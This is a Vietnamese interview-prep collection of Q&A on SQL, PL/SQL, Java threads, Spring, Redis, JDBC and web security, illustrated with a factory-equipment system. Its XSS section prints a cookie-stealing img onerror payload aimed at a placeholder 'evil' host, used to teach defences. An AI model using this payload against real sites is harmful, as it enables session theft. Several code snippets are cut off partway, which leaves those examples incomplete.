01 Thứ tự thực thi của các câu lệnh trong SQL? SQL

Thứ tự logic của một câu SELECT (optimizer có thể thực thi khác về vật lý):

FROM / JOIN → ON → WHERE → GROUP BY → HAVING → SELECT → DISTINCT → ORDER BY → LIMIT / OFFSET (TOP)
  • FROM/JOIN lấy dữ liệu thô, ON xác định điều kiện ghép bảng.
  • WHERE lọc từng dòng trước khi gom nhóm; GROUP BY gom nhóm; HAVING lọc sau khi gom nhóm.
  • SELECT tính cột/alias; DISTINCT loại trùng; ORDER BY sắp xếp; LIMIT/OFFSET giới hạn kết quả.
  • Alias của SELECT dùng được trong ORDER BY nhưng thường không dùng được trong WHERE. Window function chạy sau WHERE/GROUP BY/HAVING và trước ORDER BY.
-- SEIXX: mỗi nhà máy có bao nhiêu lần sản xuất trong tháng 9, xếp giảm dần
SELECT f.factory_name, COUNT(*) AS log_count   -- 5. SELECT (alias log_count)
FROM production_log pl                          -- 1. FROM
JOIN factory f ON f.id = pl.factory_id          -- 1. JOIN + ON
WHERE pl.logged_at >= '2026-09-01'              -- 2. WHERE (lọc từng dòng)
  AND pl.logged_at < '2026-10-01'
GROUP BY f.factory_name                         -- 3. GROUP BY
HAVING COUNT(*) > 100                           -- 4. HAVING (lọc sau gom nhóm)
ORDER BY log_count DESC                         -- 6. ORDER BY (alias dùng được)
LIMIT 10;                                       -- 7. LIMIT
Vì sao cần biết thứ tự: nếu viết WHERE COUNT(*) > 100 sẽ lỗi ngay — vì WHERE chạy khi chưa gom nhóm, đếm chưa tồn tại. Muốn lọc theo số đếm bắt buộc phải dùng HAVING.

-- DDL thật của bảng equipment (SEIXX)
CREATE TABLE equipment (
  id             BIGSERIAL PRIMARY KEY,
  factory_id     BIGINT NOT NULL,
  equipment_code VARCHAR(30) NOT NULL,
  status         VARCHAR(20) NOT NULL,
  CONSTRAINT uq_equipment UNIQUE (factory_id, equipment_code),
  CONSTRAINT fk_equipment_factory FOREIGN KEY (factory_id)
    REFERENCES factory(id) ON DELETE RESTRICT,
  CONSTRAINT ck_equipment_status

03 Chuẩn hóa dữ liệu 1NF, 2NF, 3NF là gì? Khi nào cần denormalize? Database
  • 1NF: mỗi ô chứa giá trị nguyên tử (không nhét danh sách/chuỗi nhiều giá trị vào một cột), mỗi dòng xác định duy nhất.
  • 2NF: đạt 1NF và không có phụ thuộc bộ phận — cột không khóa phải phụ thuộc vào toàn bộ khóa chính (bảng có khóa phức hợp).
  • 3NF: đạt 2NF và không có phụ thuộc bắc cầu — cột không khóa không phụ thuộc vào cột không khóa khác (ví dụ: lưu cả mã phòng ban và tên phòng ban trong bảng nhân viên).

Ví dụ: bảng chi tiết đơn hàng chỉ lưu product_id; tên/giá sản phẩm nằm ở bảng product. Chuẩn hóa giúp tránh dư thừa, update/insert/delete anomaly.

-- TRƯỚC (vi phạm 1NF và 3NF):
production_log(id, equipment_id, factory_name, category_names, logged_at)
-- category_names = 'Ép nhựa, Đóng gói'  ← 1 ô chứa nhiều giá trị (vi phạm 1NF)
-- factory_name lặp ở mọi dòng log      ← phụ thuộc bắc cầu (vi phạm 3NF)

-- SAU (chuẩn 3NF):
factory(id, factory_name)
equipment_category(id, category_name)
equipment(id, equipment_code, factory_id, category_id)
production_log(id, equipment_id, quantity, logged_at)

Chuyện thật ở SEIXX: bảng production_log ban đầu lưu thẳng factory_name và category_name của thiết bị. Khi nhà máy đổi tên, phải update hàng chục nghìn dòng và rất dễ sót; sau đó tách ra bảng factory, equipment_category và chỉ giữ FK — đổi tên 1 dòng, toàn bộ dữ liệu theo đúng.

Denormalize khi: đọc phải join quá nhiều bảng gây chậm (báo cáo, dashboard), cần cột tổng/tóm tắt (total_amount), bảng log/lịch sử. Chấp nhận dư thừa để đổi tốc độ đọc — phải kiểm soát bằng job/trigger đồng bộ hoặc ghi một chiều.

Khi phỏng vấn: chốt “chuẩn hóa đến 3NF là mặc định, denormalize có chủ đích và luôn đo lại hiệu năng”.

Kinh nghiệm: ưu tiên JOIN khi cần lấy cột; dùng EXISTS/NOT EXISTS khi chỉ cần kiểm tra tồn tại. Đừng mặc định “JOIN luôn nhanh hơn” — hãy xem execution plan và dữ liệu thực tế.

-- Semi-join: chỉ lấy sinh viên có ít nhất một điểm
SELECT s.id, s.name
FROM students s
WHERE EXISTS (
  SELECT 1 FROM scores sc WHERE sc.student_id = s.id
);

Ở SEIXX: “thiết bị chưa từng chạy sản xuất” viết bằng NOT EXISTS (anti-join); “thiết bị có sản lượng tháng 9 trên trung bình” viết bằng JOIN với subquery tính AVG — subquery chỉ trả 1 dòng nên rất nhẹ:

SELECT e.equipment_code
FROM equipment e
WHERE NOT EXISTS (                 -- anti-join: chưa có log nào
  SELECT 1 FROM production_log pl WHERE pl.equipment_id = e.id
);

SELECT e.equipment_code, SUM(pl.quantity) AS total
FROM production_log pl
JOIN equipment e ON e.id = pl.equipment_id
WHERE pl.logged_at >= '2026-09-01' AND pl.logged_at < '2026-10-01'
GROUP BY e.equipment_code
HAVING SUM(pl.quantity) > (      -- so với trung bình 1 thiết bị
  SELECT AVG(quantity) FROM production_log
);
05 Cần chú ý gì khi dùng NOT IN? SQL
Cạm bẫy NULL: nếu subquery trả về ít nhất một giá trị NULL, điều kiện NOT IN có thể trả về không dòng nào. Lý do: x NOT IN (1, NULL) tương đương x <> 1 AND x <> NULL, mà mọi so sánh với NULL đều là UNKNOWN.
-- Có thể sai nếu có student_id NULL
SELECT * FROM students
WHERE id NOT IN (SELECT student_id FROM scores);

-- An toàn hơn
SELECT * FROM students s
WHERE NOT EXISTS (
  SELECT 1 FROM scores sc WHERE sc.student_id = s.id
);

-- Hoặc loại NULL trong subquery
SELECT * FROM students
WHERE id NOT IN (
  SELECT student_id FROM scores WHERE student_id IS NOT NULL
);

Ngoài ra, NOT IN với tập giá trị lớn có thể kém hiệu quả; NOT EXISTS hoặc LEFT JOIN ... WHERE b.id IS NULL thường là lựa chọn tốt hơn.

Ở SEIXX: khi đối chiếu file CSV import với DB, cột equipment_code có thể chứa dòng rỗng/NULL nếu file khách điền thiếu — dùng NOT IN sẽ ra kết quả rỗng sai lệch, nên luôn loại NULL hoặc chuyển sang NOT EXISTS:

-- Đối chiếu: mã trong file chưa có trong DB (dạng an toàn)
SELECT t.equipment_code
FROM import_staging t
WHERE t.equipment_code IS NOT NULL
  AND NOT EXISTS (
    SELECT 1 FROM equipment e
    WHERE e.factory_id = :factoryId
      AND e.equipment_code = t.equipment_code
  );
06 PL/SQL xử lý ngoại lệ (Exception Handling) như thế nào? PL/SQL

PL/SQL dùng khối BEGIN ... EXCEPTION ... END;. Khi lỗi xảy ra, control chuyển đến phần EXCEPTION; có thể bắt exception có sẵn, exception do người dùng định nghĩa hoặc OTHERS.

BEGIN
  SELECT name INTO v_name
  FROM students
  WHERE id = p_id;

  UPDATE students SET name = p_name WHERE id = p_id;

EXCEPTION
  WHEN NO_DATA_FOUND THEN
    DBMS_OUTPUT.PUT_LINE('Không tìm thấy sinh viên');
  WHEN TOO_MANY_ROWS THEN
    DBMS_OUTPUT.PUT_LINE('Dữ liệu trả về nhiều hơn 1 dòng');
  WHEN OTHERS THEN
    DBMS_OUTPUT.PUT_LINE(SQLCODE || ': ' || SQLERRM);
    ROLLBACK;
    RAISE; -- không nuốt lỗi
END;
  • Predefined exception: NO_DATA_FOUND, TOO_MANY_ROWS, ZERO_DIVIDE, DUP_VAL_ON_INDEX...
  • User-defined: khai báo my_ex EXCEPTION;, dùng RAISE my_ex;; có thể gắn mã lỗi bằng PRAGMA EXCEPTION_INIT.
  • RAISE_APPLICATION_ERROR(-20001, 'message') để trả lỗi nghiệp vụ cho caller.
  • WHEN OTHERS nên log SQLCODE/SQLERRM và RAISE lại; tránh nuốt lỗi. Transaction nên được rollback ở tầng gọi nếu cần.

Ở SEIXX: procedure đổi trạng thái thiết bị bắt lỗi nghiệp vụ và trả message rõ cho Java thay vì để lỗi hệ thống khó hiểu:

07 Nếu SELECT INTO trả về nhiều hơn một dòng thì chuyện gì xảy ra? SQL / PL/SQL

Trong PL/SQL (Oracle): SELECT ... INTO yêu cầu đúng một dòng. Nếu không có dòng nào → NO_DATA_FOUND (ORA-01403); nếu nhiều hơn một dòng → TOO_MANY_ROWS (ORA-01422).

  • Muốn lấy nhiều dòng: dùng BULK COLLECT INTO hoặc cursor.
  • Muốn lấy một dòng xác định: thêm điều kiện duy nhất hoặc ROWNUM = 1 / FETCH FIRST 1 ROW ONLY.
  • Aggregate như COUNT(*) luôn trả về đúng một dòng (trừ khi có GROUP BY).
Phân biệt: trong SQL Server, SELECT ... INTO là câu lệnh tạo bảng mới từ kết quả SELECT và có thể chèn nhiều dòng. Còn gán biến kiểu SELECT @x = col FROM ... sẽ lấy dòng cuối cùng, không báo lỗi nhiều dòng.

Ở SEIXX: procedure lấy thông tin thiết bị theo mã — nếu gõ nhầm mã không tồn tại thì nhận NO_DATA_FOUND, còn nếu query thiếu điều kiện nhà máy mà mã bị trùng thì nhận TOO_MANY_ROWS:

BEGIN
  SELECT id, status INTO v_id, v_status
  FROM equipment
  WHERE factory_id = p_factory_id       -- luôn lọc đủ khóa nghiệp vụ
    AND equipment_code = p_code;
EXCEPTION
  WHEN NO_DATA_FOUND THEN
    RAISE_APPLICATION_ERROR(-20001, 'Không tìm thấy mã ' || p_code);
  WHEN TOO_MANY_ROWS THEN
    RAISE_APPLICATION_ERROR(-20002, 'Mã thiết bị bị trùng dữ liệu');
END;
08 AND, OR, BETWEEN, so sánh lớn/ nhỏ, IS NULL và NOT NULL khác nhau thế nào? SQL
  • AND / OR: AND có độ ưu tiên cao hơn OR. Luôn dùng ngoặc khi trộn nhiều điều kiện để tránh sai logic.
  • BETWEEN a AND b: bao gồm cả hai đầu mút. Với ngày tháng, cẩn thận phần giờ: BETWEEN '2026-01-01' AND '2026-01-31' có thể bỏ sót dữ liệu ngày 31 sau 00:00.
  • So sánh: =, <>/!=, >, >=, <, <=.
  • NULL: dùng IS NULL / IS NOT NULL; không dùng = NULL vì kết quả là UNKNOWN.
  • Hàm thay thế: SQL Server có ISNULL(col, 0); Oracle có NVL; PostgreSQL dùng COALESCE. NOTNULL không phải toán tử chuẩn — hãy dùng IS NOT NULL.

FROM orders
WHERE status = 'PAID'
  AND (created_at >= '2026-01-01' OR note IS NOT NULL);

12 Stored Procedure, Transaction và Trigger — hiểu thế nào? SQL

Stored Procedure

Đoạn logic được lưu trong DB, có tham số vào/ra, có thể chứa nhiều câu SQL, DML, transaction và được tái sử dụng. Gọi bằng CALL/EXEC. Ưu điểm: giảm round-trip, xử lý tập dữ liệu lớn, bảo mật qua quyền execute. Nhược điểm: khó version/test/debug, logic bị phân tán.

Transaction

Đơn vị công việc có tính ACID: Atomicity, Consistency, Isolation, Durability. Cần chọn isolation level phù hợp:

  • READ UNCOMMITTED: có thể dirty read.
  • READ COMMITTED: tránh dirty read, còn non-repeatable read.
  • REPEATABLE READ: tránh non-repeatable read, có thể phantom read (tùy DB).
  • SERIALIZABLE: mức chặt nhất, giảm concurrency.

Trigger

Đoạn logic tự động chạy khi INSERT/UPDATE/DELETE. Có BEFORE/AFTER/INSTEAD OF, row-level/statement-level. Dùng cho audit, ràng buộc phức tạp, đồng bộ dữ liệu; nhưng logic ẩn dễ gây khó debug và ảnh hưởng hiệu năng.

Ở SEIXX — bộ ba này phối hợp như sau: khi nhập lô sản lượng mới, service Java mở transaction gọi procedure; mỗi lần trạng thái thiết bị đổi, trigger ghi vết vào bảng audit:

-- 1) Procedure gói nghiệp vụ + transaction
CREATE OR REPLACE PROCEDURE sp_import_production(
  p_factory_id IN NUMBER, p_logged_at IN DATE) IS
BEGIN
  INSERT INTO production_log(id, equipment_id, quantity, logged_at)
  SELECT seq_log.NEXTVAL, e.id, 0, p_logged_at
  FROM equipment e WHERE e.factory_id = p_factory_id;
  UPDATE factory SET last_import_at = p_logged_at WHERE id = p_factory_id;
  COMMIT;
EXCEPTION WHEN OTHERS THEN
  ROLLBACK; RAISE;
END;

-- 2) Trigger audit chạy tự động, không cần code gọi
CREATE OR REPLACE TRIGGER trg_equipment_status_audit
AFTER UPDATE OF status ON equipment
FOR EACH ROW
BEGIN
  INSERT INTO equipment_audit(equipment_id, old_status, new_status, changed_at)
  VALUES (:OLD.id, :OLD.status, :NEW.status, SYSDATE);
END;
Lưu ý: tự COMMIT trong procedure có thể phá transaction của tầng gọi (Java) — nên để Java quản lý transaction (@Transactional) và procedure không commit khi được gọi từ app.
13 Khi nào dùng stored procedure, khi nào code trong BE/FE? Làm gì khi có 1 triệu request? SQL
  • Nên dùng SP: xử lý tập dữ liệu lớn ngay trong DB, batch/reporting, migration, logic gần dữ liệu, hệ thống legacy, yêu cầu bảo mật chỉ cho execute.
  • Nên code ở BE: business rule, orchestration nhiều service, transaction qua nhiều nguồn, cần test/version/review, logic thay đổi thường xuyên. Đây là mặc định cho dự án Spring Boot.
  • FE: chỉ validation UX (required, format), hiển thị lỗi; không đặt business rule quan trọng vì có thể bypass.
  • 1 triệu request: không chỉ “đẩy hết vào SP”. Cần cache (Redis), async/queue, rate limit, connection pool, index, partition, read replica, horizontal scaling, CDN, giảm N+1 và đo lường bằng metrics.
  • Nguyên tắc: DB là tài nguyên đắt; đừng để FE gọi DB trực tiếp hoặc đặt logic nghiệp vụ trong trigger/SP nếu không có lý do rõ ràng.

Ví dụ SEIXX — 1 triệu request xem danh sách thiết bị: gọi thẳng DB mỗi request sẽ sập. Cách xử lý theo tầng:

  • Danh mục ít đổi (nhà máy, category) → cache Redis TTL 10 phút, giảm ~90% query lặp.
  • Tác vụ nặng (import CSV 50k dòng, xuất báo cáo) → đẩy vào queue, trả về job id cho FE poll trạng thái.
  • Query còn lại → index đúng cột lọc, connection pool (~20–50), phân trang bắt buộc.
  • Báo cáo tổng hợp nặng (sản lượng theo tháng cho 500 nhà máy) → job chạy đêm ghi sẵn bảng summary, không tính realtime.

17 VIEW là gì? VIEW thường khác materialized view thế nào? SQL

VIEW là truy vấn được lưu tên trong DB; khi SELECT view, DB chạy truy vấn bên dưới. View thường không lưu dữ liệu, dùng để:

  • Đơn giản hóa join phức tạp cho cả team (view tổng hợp đơn hàng + khách hàng).
  • Giới hạn cột nhạy cảm (che lương) và cấp quyền theo view thay vì theo bảng.
  • Giữ API ổn định khi cấu trúc bảng thay đổi.

Materialized view: lưu kết quả vật lý, đọc nhanh như bảng; dữ liệu cũ cho đến khi REFRESH (on demand/on commit). Dùng cho báo cáo, aggregate nặng; đánh đổi bằng dung lượng và lịch refresh.

Ở SEIXX: nhiều màn hình cùng cần join 4 bảng (equipment, factory, category, status master) — cả team thống nhất dùng chung view vw_equipment_list để chỉ giữ 1 định nghĩa join; nhưng dashboard thống kê sản lượng chạy lại join mỗi lần quá chậm nên để job tổng hợp sẵn vào bảng summary (kiểu materialized) thay vì view thường.

Lưu ý: view lồng nhiều tầng khó tối ưu; updatable view có giới hạn (không chứa aggregate, DISTINCT...); đừng dùng view như tầng logic nghiệp vụ thay code.

18 HAVING dùng ở đâu? JOIN khác cột thì sao? DISTINCT dùng thế nào? SQL
  • HAVING lọc sau GROUP BY, thường dùng với aggregate: HAVING COUNT(*) > 5. WHERE lọc trước khi gom nhóm nên không dùng aggregate trong WHERE.
  • JOIN khác cột: chỉ cần đặt điều kiện trong ON, ví dụ ON orders.customer_id = customers.id. Không bắt buộc tên cột giống nhau. Có thể join theo nhiều cột hoặc điều kiện không bằng nhau.
  • DISTINCT loại bỏ các dòng trùng nhau trên danh sách cột SELECT. COUNT(DISTINCT col) đếm giá trị khác nhau. Lưu ý DISTINCT có thể che dấu việc JOIN bị nhân bản dòng — nên kiểm tra quan hệ dữ liệu trước.
SELECT c.id, c.name, COUNT(o.id) AS order_count
FROM customers c

20 SQL optimization: làm gì khi truy vấn chậm? Performance

Quy trình nên làm: đo → tìm nguyên nhân → sửa → đo lại, không tối ưu cảm tính.

  • Đo: slow query log, EXPLAIN ANALYZE (PostgreSQL), execution plan (SQL Server); xem full scan, sort, nested loop, số dòng ước lượng.
  • Index: tạo index đúng cột WHERE/JOIN/ORDER BY; composite đúng thứ tự; covering index; tránh index thừa.
  • Viết lại query: tránh hàm trên cột index (WHERE YEAR(created_at)=2026), tránh %keyword% nếu không cần, tránh implicit conversion, dùng EXISTS thay NOT IN khi có NULL.
  • Giảm dữ liệu: chỉ SELECT cột cần, phân trang, lọc sớm, tránh N+1, batch insert/update.
  • Thống kê & cấu trúc: cập nhật statistics, rebuild/reorganize index, partition bảng lớn, archive dữ liệu cũ.
  • Kiến trúc: cache Redis, read replica, connection pool, materialized view, denormalize có kiểm soát khi thật cần.
  • Khóa: kiểm tra lock contention, transaction quá dài, deadlock; giữ transaction ngắn.
Câu trả lời phỏng vấn: “Em sẽ xem execution plan và slow query log trước, sau đó kiểm tra index/statistics, viết lại query, rồi mới cân nhắc cache hoặc partition. Mỗi thay đổi đều đo lại hiệu năng.”

02 So sánh == và equals trong Java? Vì sao override equals phải override cả hashCode? Java
  • == so sánh giá trị bit: primitive so sánh giá trị, object so sánh địa chỉ tham chiếu.
  • equals() mặc định của Object cũng là ==; String, Integer... override để so sánh nội dung. So sánh chuỗi luôn dùng equals, không dùng ==.
  • Contract: a.equals(b) → a.hashCode() == b.hashCode() (chiều ngược lại không bắt buộc).
  • HashMap/HashSet: hashCode dùng để tìm bucket, equals dùng để so sánh trong bucket. Override equals mà quên hashCode thì hai object “bằng nhau” có thể rơi vào 2 bucket khác nhau → contains/get sai.

  if (o == null || getClass() != o.getClass()) return false;
  Student s = (Student) o;
  return Objects.equals(id, s.id);
}

@Override
public int hashCode() {
  return Objects.hash(id);
}

Với entity JPA: không nên equals dựa trên toàn bộ field hoặc id tự tăng khi chưa persist; thường dùng khóa nghiệp vụ (business key). Record hoặc Lombok @EqualsAndHashCode giúp sinh tự động.

07 Tham trị và tham chiếu là gì? Java truyền tham trị hay tham chiếu? Java
Java luôn truyền tham trị (pass-by-value). Với object, giá trị được truyền là bản sao của reference, không phải bản thân object.
  • Primitive: truyền bản sao giá trị; thay đổi trong method không ảnh hưởng biến gốc.
  • Object: truyền bản sao reference; cả hai reference cùng trỏ tới một object. Nếu method thay đổi nội dung object, caller thấy thay đổi. Nếu method gán lại reference, caller không thấy.
  • String là immutable: mọi phép “thay đổi” tạo object mới, nên hành vi giống primitive khi nhìn từ bên ngoài.
void mutate(StringBuilder sb) {
  sb.append(" world"); // caller thấy thay đổi
}

void reassign(StringBuilder sb) {
  sb = new StringBuilder("new"); // caller KHÔNG thấy
}

StringBuilder x = new StringBuilder("hello");
mutate(x);   // x = "hello world"
reassign(x); // x vẫn là "hello world"

16 Quản lý ngoại lệ và Null Safety với Optional? Java

18 Thread là gì? Có mấy cách tạo thread và nên dùng cách nào? Java

Thread là đơn vị thực thi nhỏ nhất trong một process. Các thread chia sẻ chung heap + method area, mỗi thread có stack và program counter riêng — nhờ đó tận dụng CPU khi có tác vụ I/O (chờ file, chờ DB).

  • Cách 1 — extends Thread: đơn giản nhưng chiếm mất suất kế thừa, task gắn chặt với cơ chế chạy → ít dùng.
  • Cách 2 — implements Runnable: tách task khỏi thread, linh hoạt hơn; nhưng vẫn phải tự tạo Thread.
  • Cách 3 — ExecutorService (thread pool): cách dùng thực tế trong web app — tái sử dụng thread, giới hạn số lượng, có hàng đợi.
  • Cách 4 — CompletableFuture: bất đồng bộ và compose nhiều bước (Java 8+).
// Cách 2: Runnable với lambda
Thread t = new Thread(() -> System.out.println("importing..."));
t.start();

// Cách 3: thread pool — khuyên dùng
ExecutorService pool = Executors.newFixedThreadPool(4);
Future<ImportResult> f = pool.submit(() -> importCsv(file));

// Cách 4: bất đồng bộ có compose
CompletableFuture.supplyAsync(() -> parseCsv(file), pool)
    .thenApply(this::validate)
    .thenAccept(this::saveBatch);

Ở SEIXX: import 10.000 dòng CSV — đọc và validate chia theo chunk chạy song song trên pool, ghi DB theo batch 500. Không new Thread() thủ công trong web app: mỗi request một thread sẽ nổ số thread khi tải cao, phải dùng pool có cấu hình core/max/queue.

19 Trình bày vòng đời của một thread trong Java (6 trạng thái)? Java

Thread.getState() trả về Thread.State với 6 trạng thái:

  1. NEW: đã tạo new Thread(...) nhưng chưa gọi start().
  2. RUNNABLE: đã start() — sẵn sàng chạy hoặc đang chạy, chờ CPU/OS scheduler.
  3. BLOCKED: chờ khóa monitor để vào vùng synchronized.
  4. WAITING: chờ vô thời hạn — Object.wait(), thread.join(), LockSupport.park().
  5. TIMED_WAITING: chờ có thời hạn — Thread.sleep(ms), wait(ms), join(ms).
  6. TERMINATED: run() đã kết thúc (bình thường hoặc do exception).
NEW --start()--> RUNNABLE --(chờ monitor)--> BLOCKED --(lấy được lock)--> RUNNABLE
RUNNABLE --sleep(ms)/wait(ms)--> TIMED_WAITING --(hết thời gian/notify)--> RUNNABLE
RUNNABLE --wait()/join()--> WAITING --(notify()/thread kết thúc)--> RUNNABLE
RUNNABLE --run() kết thúc--> TERMINATED

Thread t = new Thread(() -> {
  synchronized (lock) {        // có thể BLOCKED khi tranh lock
    Thread.sleep(500);         // TIMED_WAITING
  }
});
t.start();
System.out.println(t.getState());  // RUNNABLE / TIMED_WAITING / ...
  • Phân biệt: gọi start() mới sinh thread mới; gọi trực tiếp run() chỉ là gọi hàm bình thường trên thread hiện tại.
  • Không dừng thread bằng stop() (deprecated, có thể để lại trạng thái dở dang) — dùng cờ volatile boolean running hoặc interrupt() + kiểm tra isInterrupted().
  • Hay hỏi tiếp: sleep() không nhả lock, còn wait() nhả lock — nên wait() phải gọi trong synchronized.

Ở SEIXX: import CSV chạy nền — log getActiveCount() và getQueue().size() của pool; thread đọc file hay ở TIMED_WAITING, thread ghi batch có thể BLOCKED khi tranh connection. Nhìn state giúp phát hiện deadlock/starvation thay vì đoán.

  Map<Long, Student> existing = repo.findAllById(
      items.stream().map(StudentUpdateDto::id).toList())
      .stream().collect(Collectors.toMap(Student::getId, s -> s));

  for (var dto : items) {
    Student s = existing.get(dto.id());
    if (s == null) throw new NotFoundException(dto.id());
    s.update(dto);
  }
  return existing.values().stream().map(StudentDto::from).toList();
}

12 Làm gì để không bị tấn công XSS? Security

XSS xảy ra khi dữ liệu không tin cậy được chèn vào HTML/JS mà không encode đúng ngữ cảnh. Có 3 loại: stored, reflected, DOM-based.

  • Output encoding: encode theo context (HTML, attribute, URL, JavaScript). Thymeleaf tự escape; không dùng th:utext với dữ liệu người dùng.
  • Vue/React: interpolation {{ }} tự escape; tránh v-html/dangerouslySetInnerHTML; nếu buộc phải dùng, sanitize bằng DOMPurify.
  • Validate input theo whitelist; không chỉ blacklist ký tự.
  • CSP (Content-Security-Policy), X-Content-Type-Options: nosniff, X-Frame-Options.
  • Cookie: HttpOnly, Secure, SameSite.
  • Java: OWASP Java Encoder, HtmlUtils.htmlEscape; không nối chuỗi HTML thủ công.
  • Không render lỗi/stack trace ra HTML; cập nhật dependency và framework.

Ví dụ stored XSS ở SEIXX: ghi chú thiết bị cho phép nhập tự do; nếu FE hiển thị bằng v-html thì đoạn <img src=x onerror="fetch('//evil?c='+document.cookie)"> do user nhập sẽ chạy trên máy người khác khi mở danh sách. Cách chặn đúng:

<!-- SAI: render thô HTML người dùng nhập -->
<div v-html="equipment.note"></div>

<!-- ĐÚNG: interpolation tự escape -->
<div>{{ equipment.note }}</div>

<!-- Bắt buộc giữ HTML (rich text) thì sanitize trước -->
<div v-html="DOMPurify.sanitize(equipment.note)"></div>

Đồng thời backend validate whitelist khi lưu, và access token để trong memory (không localStorage) để cookie/token không bị đọc trộm.

13 Hash mật khẩu và JWT: lưu mật khẩu thế nào cho an toàn? JWT hoạt động ra sao? Security

1. Hash mật khẩu — lưu trong DB

  • Không bao giờ lưu plaintext; không dùng MD5/SHA-256 đơn thuần (hash quá nhanh, dễ brute force/rainbow table).
  • Dùng BCrypt/Argon2/PBKDF2 có salt; Spring Security dùng BCryptPasswordEncoder. Đăng nhập chỉ so khớp bằng matches(raw, hash) — hash một chiều, không giải mã được.

2. Luồng đăng nhập — qua từng tầng

FE · POST /api/auth/login→AuthController→AuthService→UserRepository / DB→TokenProvider→FE
  • AuthController: nhận {username, password}, validate @NotBlank; không xử lý nghiệp vụ.
  • AuthService: userRepository.findByUsername() → kiểm tra user tồn tại và đang active → encoder.matches(raw, user.passwordHash). Sai thì trả thông báo chung “sai tài khoản hoặc mật khẩu”, không tiết lộ cái nào sai.
  • DB: bảng users (username unique, password_hash, role, status). User bị khóa thì từ chối dù mật khẩu đúng.
  • TokenProvider: ký access token 15–30 phút (claims: sub, role, exp; HS256 secret hoặc RS256 private key) và refresh token 7–30 ngày lưu DB kèm user_id, expires_at, revoked.
  • Trả về FE: access token trong body (FE giữ trong memory); refresh token set vào cookie httpOnly + Secure + SameSite — JavaScript không đọc được.

3. Xác thực Bearer — mỗi request sau đó

FE · Authorization: Bearer …→JwtAuthenticationFilter→SecurityContext→Controller / Service
  • Filter (OncePerRequestFilter, đặt trước filter chuẩn của Spring Security): lấy header → bỏ tiền tố Bearer → verify chữ ký + exp → lấy username/roles từ claims → tạo UsernamePasswordAuthenticationToken → SecurityContextHolder.getContext().setAuthentication(...).
  • Token sai/hết hạn → không set authentication, request đi tiếp và tầng phân quyền trả 401/403 (không ném lỗi trong filter để tránh lộ chi tiết).
  • Controller/Service: lấy user hiện tại qua @AuthenticationPrincipal; kiểm tra quyền nghiệp vụ thêm — user nhà máy A không được xem dữ liệu nhà máy B (phân quyền theo dữ liệu, không chỉ theo role).
public class JwtAuthenticationFilter extends OncePerRequestFilter {
  @Override
  protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res,
      FilterChain chain) throws ServletException, IOException {
    String header = req.getHeader("Authorization");
    if (header != null && header.startsWith("Bearer ")) {
      String token = header.substring(7);
      if (tokenProvider.isValid(token)) {
        SecurityContextHolder.getContext()
            .setAuthentication(tokenProvider.toAuthentication(token));
      }
    }
    chain.doFilter(req, res);
  }
}

4. Refresh token và logout

  • Refresh: access token hết hạn → FE gọi POST /api/auth/refresh (cookie tự gửi kèm) → server kiểm tra refresh token trong DB (còn hạn, chưa revoked) → cấp access token mới + rotation (revoke token cũ, phát token mới).
  • Logout/thu hồi: revoke refresh token trong DB + xóa cookie; access token còn hạn xử lý bằng blacklist ngắn hạn (Redis) hoặc token version.
Nhớ: payload JWT chỉ base64, không mã hóa — không đặt dữ liệu nhạy cảm; server luôn verify chữ ký + exp và không tin dữ liệu client gửi; tránh lưu access token trong localStorage (XSS đọc được).
14 Kết nối database dùng gì? JDBC hoạt động thế nào? Backend

Java kết nối DB qua JDBC (Java Database Connectivity). Có thể dùng trực tiếp DriverManager, DataSource, JdbcTemplate, hoặc qua ORM (Hibernate/JPA), MyBatis, Doma — tất cả đều dùng JDBC bên dưới.

  • DataSource + connection pool (HikariCP mặc định trong Spring Boot) để tái sử dụng connection, giảm chi phí mở kết nối.
  • PreparedStatement để bind tham số, tránh SQL injection và tăng hiệu năng.
  • try-with-resources để đóng ResultSet/Statement/Connection.
  • Transaction: tắt auto-commit, commit()/rollback(); Spring quản lý qua @Transactional.
try (Connection c = dataSource.getConnection();
     PreparedStatement ps = c.prepareStatement(
         "SELECT id, name FROM students WHERE id = ?")) {
  ps.setLong(1, id);
  try (ResultSet rs = ps.executeQuery()) {
    if (rs.next()) return new Student(rs.getLong("id"), rs.getString("name"));
  }
}

18 Xử lý caching với Redis như thế nào? Redis hoạt động ra sao? Nếu Redis lỗi thì sao? Redis

Redis hoạt động

Redis là in-memory key-value store, xử lý lệnh chủ yếu trên một event loop đơn luồng (một số phiên bản có I/O threads), hỗ trợ nhiều cấu trúc: string, hash, list, set, sorted set, stream. Dữ liệu có thể được persist bằng RDB snapshot hoặc AOF; hỗ trợ replication, Sentinel và Cluster.

Cache-aside (phổ biến)

  1. Đọc GET key từ Redis.
  2. Nếu miss → query DB → ghi SET key value EX ttl → trả kết quả.
  3. Khi update → cập nhật DB rồi xóa/invalidate cache (hoặc write-through có kiểm soát).

Nếu Redis không trả dữ liệu

  • Miss: fallback DB bình thường.
  • Redis down/timeout: bắt exception, fallback DB, không để cache failure làm sập request; dùng timeout ngắn, circuit breaker, local cache tạm, log/metrics.
  • Cache stampede: dùng lock/mutex, jitter TTL, stale-while-revalidate, singleflight.
  • Hot key: local cache, sharding key, replica.
  • Nhất quán: TTL hợp lý, invalidate sau commit, chấp nhận eventual consistency; không cache dữ liệu nhạy cảm chưa mã hóa.
// SEIXX: cache danh mục nhà máy (500 dòng, ít đổi)
public FactoryDto getFactory(Long id) {
  String key = "factory:" + id;
  String cached = redis.get(key);
  if (cached != null) return json.from(cached, FactoryDto.class); // hit

      .orElseThrow(() -> new BusinessException("FACTORY_NOT_FOUND"));

  redis.setex(key, Duration.ofMinutes(10), json.to(dto)); // miss → nạp lại
  return dto;
}

19 Nếu DB bị nặng, truy vấn lâu hơn trước thì làm gì? Performance
  1. Đo: slow query log, APM, execution plan; xác định query nào chậm, tần suất, dữ liệu tăng hay lock.
  2. Index/statistics: kiểm tra index thiếu/thừa, cập nhật statistics, tránh function trên cột index.
  3. Query: giảm N+1, bỏ SELECT *, phân trang, viết lại join/subquery, batch.
  4. Khóa: transaction dài, lock contention, deadlock; giảm phạm vi transaction.
  5. Dữ liệu lớn: partition, archive dữ liệu cũ, materialized view.
  6. Kiến trúc: cache Redis, read replica, connection pool, scale up/out.
  7. Đo lại sau mỗi thay đổi; không tối ưu mù quáng.

23 Giải thích IoC và bean trong Spring? @Autowired hoạt động thế nào? Spring Core

IoC (Inversion of Control): thay vì class tự tạo dependency, container Spring tạo và inject dependency. DI (Dependency Injection) là cách hiện thực IoC.

  • Bean: object được Spring quản lý (tạo, inject, lifecycle).
